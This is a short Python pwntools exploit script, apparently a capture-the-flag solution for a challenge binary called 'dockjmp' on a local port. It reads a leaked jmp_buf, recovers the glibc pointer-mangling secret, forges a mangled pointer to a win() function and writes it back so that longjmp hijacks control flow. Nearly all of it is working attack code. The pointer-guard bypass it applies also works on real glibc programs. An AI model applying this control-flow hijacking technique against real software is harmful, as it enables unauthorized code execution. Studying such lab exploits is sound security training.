from pwn import *

"""
The address of the instruction after the call to setjmp is mangled and put into
jmp_buf[56:56+8]. This is where control flow is returned to when calling
longjmp, so we recover the ptr enc secret and mangle the win function, then
replace this field to call win() when longjmp is triggered.
"""

context.log_level = 'debug'
context.arch = 'amd64'
context.word_size = 64

def rol64(x, r):
    return ((x << r) & ((1<<64)-1)) | (x >> (64-r))

def ror64(x, r):
    return (x >> r) | ((x << (64-r)) & ((1<<64)-1))

def mangle_ptr(p, secret):
    return rol64((p ^ secret) & ((1<<64)-1), 17)

def mangle_recover_secret(enc, orig):
    return ror64(enc, 17) ^ orig

exe = ELF("../publish/dockjmp")

# conn = process([exe.path])
conn = remote('localhost', 1337)

given = bytes.fromhex(conn.recvline().decode().split(': ')[1])
for i in range(0, len(given), 8):
    print(given[i:i+8].hex())

secret = mangle_recover_secret(u64(given[56:56+8]), 0x4012b7)
print('ptr enc secret:', hex(secret))

mangled_win = mangle_ptr(exe.sym['win']+5, secret)
given = bytearray(given)
given[56:56+8] = p64(mangled_win)

conn.sendlineafter(b'jmp_buf:', given)

conn.interactive()
